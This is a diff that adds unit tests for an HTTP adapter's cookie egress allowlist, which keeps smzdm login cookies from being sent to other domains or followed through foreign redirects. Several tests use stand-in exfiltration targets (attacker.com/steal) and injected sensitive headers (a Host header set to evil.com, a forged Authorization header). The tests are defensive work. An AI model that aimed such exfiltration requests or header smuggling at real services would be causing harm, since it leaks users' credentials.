@@ -29,10 +29,12 @@ after(() => {
 function mockFetch(impl) {
   globalThis.fetch = impl;
 }
-function fakeResp({ ok = true, status = 200, body = '' } = {}) {
+function fakeResp({ ok = true, status = 200, body = '', headers = {} } = {}) {
   return {
     ok,
     status,
+    statusText: '',
+    headers: { get: (k) => (headers[String(k).toLowerCase()] ?? null) },
     text: async () => body
   };
 }
@@ -136,6 +138,68 @@ test('call：raw 模式返回原始文本', async () => {
   mockFetch(async () => fakeResp({ body: 'callback({"raw":1})' }));
   const text = await realAdapter.requestRaw('https://example.com/jp', { raw: true });
   assert.equal(text, 'callback({"raw":1})');
+});
+
+// ===================== Phase 1：Cookie 出口白名单 / 敏感头 / 手动跳转 =====================
+
+test('call：带 Cookie 发往非 smzdm 域名被拒绝（防 Cookie 泄露）且不发起请求', async () => {
+  let called = false;
+  mockFetch(async () => { called = true; return fakeResp(); });
+  await assert.rejects(
+    () => realAdapter.requestRaw('https://attacker.com/steal', { cookie: 'sess=abc' }),
+    /拒绝将登录凭据发往非 smzdm 域名/
+  );
+  assert.equal(called, false, '非 smzdm 域名不应发起任何请求');
+});
+
+test('call：带 Cookie 发往 smzdm 子域正常', async () => {
+  mockFetch(async () => fakeResp({ body: '{"error_code":0}' }));
+  const json = await realAdapter.requestRaw('https://user-api.smzdm.com/checkin', { cookie: 'sess=abc' });
+  assert.equal(json.error_code, 0);
+});
+
+test('call：不带 Cookie 的发往公网域名仍走 SSRF 校验（保持原有行为）', async () => {
+  mockFetch(async () => fakeResp({ body: '{"x":1}' }));
+  const json = await realAdapter.requestRaw('https://example.com/api', {});
+  assert.equal(json.x, 1);
+});
+
+test('call：extraHeaders 无法覆盖敏感头（Cookie/Authorization/Host）', async () => {
+  let captured;
+  mockFetch(async (url, init) => { captured = init; return fakeResp({ body: '{"error_code":0}' }); });
+  await realAdapter.requestRaw('https://user-api.smzdm.com/x', {
+    cookie: 'sess=abc',
+    extraHeaders: { Authorization: 'Bearer HACK', Host: 'evil.com', 'X-Foo': 'keep' }
+  });
+  assert.equal(captured.headers.Authorization, undefined, 'Authorization 应被剥离');
+  assert.equal(captured.headers.Host, undefined, 'Host 应被剥离');
+  assert.equal(captured.headers.Cookie, 'sess=abc', '真实 Cookie 仍保留');
+  assert.equal(captured.headers['X-Foo'], 'keep', '非敏感头保留');
+});
+
+test('call：带 Cookie 时 302 跳转到 smzdm 域被跟随', async () => {
+  let n = 0;
+  mockFetch(async (url) => {
+    n++;
+    if (n === 1) return fakeResp({ status: 302, headers: { location: 'https://zhiyou.smzdm.com/next' } });
+    return fakeResp({ body: '{"error_code":0}' });
+  });
+  const json = await realAdapter.requestRaw('https://user-api.smzdm.com/start', { cookie: 'sess=abc' });
+  assert.equal(json.error_code, 0);
+  assert.equal(n, 2, '应跟随一次同域族跳转');
+});
+
+test('call：带 Cookie 时 302 跳转到非 smzdm 域被拒绝（防 Cookie 泄露）', async () => {
+  let calledTarget = false;
+  mockFetch(async (url) => {
+    if (String(url).includes('attacker.com')) { calledTarget = true; return fakeResp(); }
+    return fakeResp({ status: 302, headers: { location: 'https://attacker.com/steal' } });
+  });
+  await assert.rejects(
+    () => realAdapter.requestRaw('https://user-api.smzdm.com/start', { cookie: 'sess=abc' }),
+    /拒绝跟随重定向到非授权地址/
+  );
+  assert.equal(calledTarget, false, '绝不应把 Cookie 带往非授权跳转目标');
 });
 
 // ===================== 互动方法（注入 callImpl） =====================
